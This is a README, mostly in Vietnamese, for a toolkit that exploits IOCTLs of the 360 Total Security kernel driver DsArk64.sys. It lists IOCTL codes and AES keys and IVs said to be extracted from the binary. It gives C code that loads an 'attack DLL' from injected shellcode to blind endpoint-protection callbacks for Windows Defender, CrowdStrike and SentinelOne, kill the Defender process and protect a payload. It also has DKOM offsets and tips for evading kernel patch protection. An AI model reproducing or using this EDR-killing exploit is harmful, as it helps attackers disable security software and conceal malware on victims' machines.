# DsArk64.sys IOCTL Wrapper

Công cụ test và khai thác IOCTLs của `DsArk64.sys` (360 Total Security kernel driver).

## Cấu trúc files

```
dsark64.h               — Tất cả constants, IOCTL codes, crypto keys, API declarations
dsark64_crypto.cpp      — AES-128-CBC (BCrypt), MD5, per-PID key derivation
dsark64_ioctl.cpp       — Wrapper cho từng IOCTL (encrypt/build buffer/DeviceIoControl)
dsark64_attack.cpp      — Attack primitives (callback removal, ETW-TI, DKOM)
dsark64_test.cpp        — Test harness (standalone EXE)
dsark64_attack_main.cpp — Attack DLL entry + exported functions
dsark64_attack.def      — DLL export definitions
build.bat               — Build script (Visual Studio x64)
```

## Build

```bat
:: Cần: Visual Studio 2019/2022, Windows SDK
:: Mở "x64 Native Tools Command Prompt for VS"
build.bat
```

## Prerequisites để chạy

1. **Administrator privilege** (bắt buộc — SeTokenIsAdmin check trong driver)
2. **Một trong hai:**
   - 360 Total Security đang chạy (device `\Device\360SelfProtection` tồn tại)
   - **HOẶC** inject DLL/EXE vào một process của 360 (360sd.exe, 360tray.exe, v.v.)
3. Registry key phải tồn tại:
   `HKLM\SYSTEM\CurrentControlSet\services\360FsFlt` → `daboot = DWORD:1`

## Test EXE (`dsark64_test.exe`)

```
Chạy từ bên trong 360 process (sau khi inject) hoặc
trực tiếp nếu 360SelfProtection device accessible:

dsark64_test.exe
```

Tests thực hiện:
- `[TEST] Crypto` — AES-CBC round-trip, MD5, per-PID key derive
- `[TEST] 0x80863000` — Version query (expected: 0x11000231)
- `[TEST] 0x80863020` — Kernel addr check
- `[TEST] 0x80863028 type=2` — Kernel read (đọc ntoskrnl MZ header)
- `[TEST] 0x80863028 type=1` — Kernel write round-trip (write same bytes back)
- `[TEST] 0x8086300C` — Encrypted kill dry run (dùng own PID → driver reject)
- `[TEST] 0x80863004` — File protect add+remove
- `[TEST] 0x80863080` — Simple kill (interactive, nhập PID)

## Attack DLL (`dsark64_attack.dll`)

Inject vào 360 process, sau đó gọi:

```c
// Load DLL từ injected shellcode:
HMODULE h = LoadLibraryW(L"dsark64_attack.dll");

// Khởi tạo (mở device handle)
typedef BOOL(*pfInit)(void);
pfInit Init = (pfInit)GetProcAddress(h, "DsArk_Init");
Init();

// Verify
typedef DWORD(*pfVer)(void);
pfVer Ver = (pfVer)GetProcAddress(h, "DsArk_Version");
DWORD ver = Ver();  // phải là 0x11000231

// Full chain: blind WdFilter, kill MsMpEng (PID), protect payload
typedef BOOL(*pfChain)(const WCHAR*, DWORD, const WCHAR*);
pfChain Chain = (pfChain)GetProcAddress(h, "DsArk_FullChain");
Chain(L"WdFilter.sys", 1234 /*MsMpEng PID*/, L"C:\\payload.exe");

// Or just: blind EDR callbacks
typedef BOOL(*pfBlind)(const WCHAR*);
pfBlind Blind = (pfBlind)GetProcAddress(h, "DsArk_BlindEDR");
Blind(L"WdFilter.sys");   // Windows Defender
// Blind(L"CsFalconService.sys");  // CrowdStrike
// Blind(L"SentinelMonitor.sys");  // SentinelOne
```

## IOCTL Quick Reference

| IOCTL | Primitive | Crypto | Input |
|-------|-----------|--------|-------|
| `0x80863000` | Version | None | 4-byte output |
| `0x80863004` | File protect | AES-CBC (session) | 0x400 bytes |
| `0x80863008` | Simple kill | None | DWORD pid |
| `0x8086300C` | Enc kill | AES-CBC (per-PID) | 16 bytes |
| `0x80863010` | Enc kill (alt) | AES-CBC (per-PID) | 16 bytes |
| `0x80863014` | Clear flag | None | any |
| `0x80863020` | Kern addr check | None | 0x10 bytes (magic first) |
| `0x80863024` | Set mode | None | DWORD (0/1) |
| `0x80863028` | Kern read/write | AES-CBC + MD5 | 0x20..0x400 bytes |
| `0x80863040` | Registry protect | AES-CBC (session) | 0x400 bytes |
| `0x80863080` | Simple kill | None | DWORD pid |

## Crypto Keys (extracted from binary)

```
Session AES-128 Key: 62 B4 56 EC 40 7F 0A 9A 05 91 1C B6 F2 38 A7 FE
Session AES-CBC IV:  E5 93 29 B6 D4 08 E7 FA 55 76 37 E6 2C 9E AA 43

Kill Base Key:  70 13 6A A9 49 14 91 C3 7C 6D A1 95 CA FA D5 42
Kill Base IV:   A6 1F 41 4C 0C 29 73 A1 F6 4F 03 77 BA DF DD 40
```

## EPROCESS offsets cho DKOM

| Windows Build | ActiveProcessLinks | UniqueProcessId |
|---------------|-------------------|-----------------|
| 10 1507–1903  | 0x2E8             | 0x2E0           |
| 10 2004+      | 0x448             | 0x440           |
| 11 21H2       | 0x448             | 0x440           |
| 11 22H2+      | 0x448             | 0x440           |

## Notes

- Kernel read: max **32 bytes** per call (multiple calls batched automatically)
- Kernel write: max **512 bytes** per call
- Không trigger KPP: callback tables, ETW_REG_ENTRY.EnableCount không bị monitor
- Tránh write vào: SSDT, IDT, GDT, kernel code pages (KPP sẽ BSOD)
